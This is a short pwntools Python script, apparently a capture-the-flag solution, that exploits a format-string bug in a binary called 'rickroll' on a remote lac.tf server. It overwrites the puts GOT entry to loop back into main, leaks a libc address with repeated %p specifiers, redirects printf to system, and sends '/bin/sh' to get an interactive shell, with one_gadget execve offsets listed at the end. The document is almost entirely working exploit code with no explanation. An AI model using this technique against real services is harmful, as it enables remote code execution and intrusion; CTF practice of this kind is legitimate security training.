#!/usr/bin/python3
from pwn import *

exe = './rickroll'
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* main+149
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()
p = remote("lac.tf", 31135)

p.sendline(fmtstr_payload(6, { elf.got.puts: elf.sym.main+73}))
p.sendline(b"-%p"*50)
p.recvlines(2)
leak =p.recvline()
print(leak)
libc.address = int(leak.split(b"-")[-11], 16) - 146698
log.info(f"libc: {hex(libc.address)}")

p.sendline(fmtstr_payload(8, {elf.got.printf: libc.sym.system}))
p.sendline(b"/bin/sh\x00")
p.interactive()
'''
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''